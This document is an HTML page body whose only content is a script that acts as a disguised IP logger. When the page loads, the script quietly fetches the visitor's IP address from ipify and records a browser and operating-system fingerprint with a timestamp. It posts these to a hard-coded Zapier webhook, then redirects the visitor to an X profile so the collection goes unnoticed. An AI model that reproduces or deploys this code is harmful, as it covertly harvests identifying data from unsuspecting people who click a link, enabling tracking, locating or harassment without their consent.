<body>

<script>

const REDIRECT_URL = "https://x.com/GoonL51468";

function simplifyUserAgent() {
    const ua = navigator.userAgent;

    let os = "Unknown OS";
    let browser = "Unknown Browser";
    let device = /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop";

    if (ua.includes("Windows NT 10")) os = "Windows 10/11";
    else if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "MacOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Linux")) os = "Linux";

    if (ua.includes("Chrome")) {
        const match = ua.match(/Chrome\/(\d+)/);
        browser = match ? "Chrome " + match[1] : "Chrome";
    }
    else if (ua.includes("Firefox")) {
        const match = ua.match(/Firefox\/(\d+)/);
        browser = match ? "Firefox " + match[1] : "Firefox";
    }
    else if (ua.includes("Safari") && !ua.includes("Chrome")) {
        browser = "Safari";
    }
    else if (ua.includes("Edg")) {
        browser = "Edge";
    }

    return `${os} | ${browser} | ${device}`;
}

async function getIP() {
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();

        await sendToZapier(data.ip);

    } catch (error) {
        console.error("Error getting IP:", error);
    }

    window.location.href = REDIRECT_URL;
}

async function sendToZapier(ip) {
    const webhookUrl = "https://hooks.zapier.com/hooks/catch/26728524/ux98dy8/";

    const now = new Date();

    const formattedTime =
        now.getFullYear() + "-" +
        String(now.getMonth()+1).padStart(2,'0') + "-" +
        String(now.getDate()).padStart(2,'0') + " " +
        String(now.getHours()).padStart(2,'0') + ":" +
        String(now.getMinutes()).padStart(2,'0') + ":" +
        String(now.getSeconds()).padStart(2,'0');

    const simpleUA = simplifyUserAgent();

    const formData = new URLSearchParams({
        ip_address: ip,
        timestamp: formattedTime,
        user_agent: simpleUA
    });

    try {
        await fetch(webhookUrl, {
            method: "POST",
            body: formData
        });
    } catch (error) {
        console.error("Zapier send failed:", error);
    }
}

getIP();

</script>
